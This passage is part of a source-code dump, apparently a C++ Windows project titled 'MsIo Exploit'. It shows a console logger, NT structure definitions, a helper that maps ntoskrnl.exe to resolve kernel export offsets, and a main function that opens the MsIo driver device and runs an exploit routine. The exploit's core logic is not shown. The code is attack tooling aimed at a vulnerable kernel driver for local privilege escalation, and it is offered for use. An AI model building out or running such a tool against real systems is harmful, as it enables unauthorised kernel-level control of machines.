	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#pragma once
#include <iostream>

#ifndef ENABLE_VIRTUAL_TERMINAL_PROCESSING
#define ENABLE_VIRTUAL_TERMINAL_PROCESSING  0x0004
#endif

static bool enable_ansi_escape()
{
    DWORD console_mode = 0;
    HANDLE std_handle = GetStdHandle(STD_OUTPUT_HANDLE);

    if (std_handle == INVALID_HANDLE_VALUE)
        return false;

    if (GetConsoleMode(std_handle, &console_mode) == FALSE)
        return false;

    // enable ANSI escape codes
    console_mode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;

    if (SetConsoleMode(std_handle, console_mode) == FALSE)
        return false;

    return true;
}

template <typename ... T>
__forceinline void print_info(const char* format, T const& ... args)
{
	printf("[\033[96m*\033[0m]\033[33m ");
	printf(format, args ...);
    printf("\033[0m");
}

template <typename ... T>
__forceinline void print_bad(const char* format, T const& ... args)
{
    printf("[\033[91m!\033[0m]\033[33m ");
    printf(format, args ...);
    printf("\033[0m");
}

template <typename ... T>
__forceinline void print_good(const char* format, T const& ... args)
{
    printf("[\033[92m+\033[0m]\033[33m ");
    printf(format, args ...);
    printf("\033[0m");
}
```

`src/main.cpp`:

```cpp
/*

    MIT License

    Copyright (c) 2021 Kento Oki

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

*/

#include <windows.h>
#include <iostream>

#include "logger.hpp"
#include "exploit.hpp"

int wmain(int argc, const wchar_t** argv, const wchar_t** envp)
{
    enable_ansi_escape();

    print_info("MsIo Exploit\n");

    if (!msio::init())
    {
        print_bad("failed to init MsIo device\n");
        return EXIT_FAILURE;
    }

    if (!exploit::singleton().execute())
    {
        print_bad("failed to execute exploit");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```

`src/nt.hpp`:

```hpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#pragma once
#include <windows.h>

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY
{
	ULONG Unknow1;
	ULONG Unknow2;
	ULONG Unknow3;
	ULONG Unknow4;
	PVOID DllBase;
	ULONG Size;
	ULONG Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT ModuleNameOffset;
	char ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL              ((NTSTATUS)0xC0000001L)
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)

typedef enum _POOL_TYPE {
	NonPagedPool,
	NonPagedPoolExecute = NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed = NonPagedPool + 2,
	DontUseThisType,
	NonPagedPoolCacheAligned = NonPagedPool + 4,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
	MaxPoolType,
	NonPagedPoolBase = 0,
	NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
	NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
	NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
	NonPagedPoolSession = 32,
	PagedPoolSession = NonPagedPoolSession + 1,
	NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
	DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
	NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
	PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
	NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
	NonPagedPoolNx = 512,
	NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
	NonPagedPoolSessionNx = NonPagedPoolNx + 32,
} POOL_TYPE;
```

`src/stub.cpp`:

```cpp
/*

	MIT License

	Copyright (c) 2021 Kento Oki

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/

#include "stub.hpp"

ntoskrnl::ntoskrnl()
{
	if (this->ntoskrnl_blob)
	{
		return;
	}

	this->ntoskrnl_blob =
		reinterpret_cast<uint8_t*>(
			LoadLibrary(
				TEXT("ntoskrnl.exe")));

	print_good("ntoskrnl blob mapped to 0x%p\n", this->ntoskrnl_blob);
}

ntoskrnl::~ntoskrnl()
{
	FreeLibrary(reinterpret_cast<HMODULE>(this->ntoskrnl_blob));
}

vaddr64_t<uint64_t> ntoskrnl::find_export(std::string_view routine_name)
{
	return vaddr64_t<uint64_t>({
		reinterpret_cast<uint64_t>(this->ntoskrnl_blob),
		reinterpret_cast<uint64_t>(GetProcAddress(
			reinterpret_cast<HMODULE>(this->ntoskrnl_blob),
			reinterpret_cast<LPCSTR>(routine_name.data())))});
}

```

`src/stub.hpp`:

```hpp
/*

    MIT License

    Copyright (c) 2021 Kento Oki

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

*/

#pragma once
#include <windows.h>

#include "logger.hpp"

template<typename T>
struct vaddr64_t
{
    T base;
    T value;

    T as_rva()
    {
        return value - base;
    }

    T as_abs()
    {
        return value;
    }
};

class ntoskrnl
{
public:
    explicit ntoskrnl();
    ~ntoskrnl();

    vaddr64_t<uint64_t> find_export(std::string_view routine_name);

    static ntoskrnl& singleton()
    {
        static ntoskrnl instance;
        return instance;
    }
private:
    uint8_t* ntoskrnl_blob;
};


```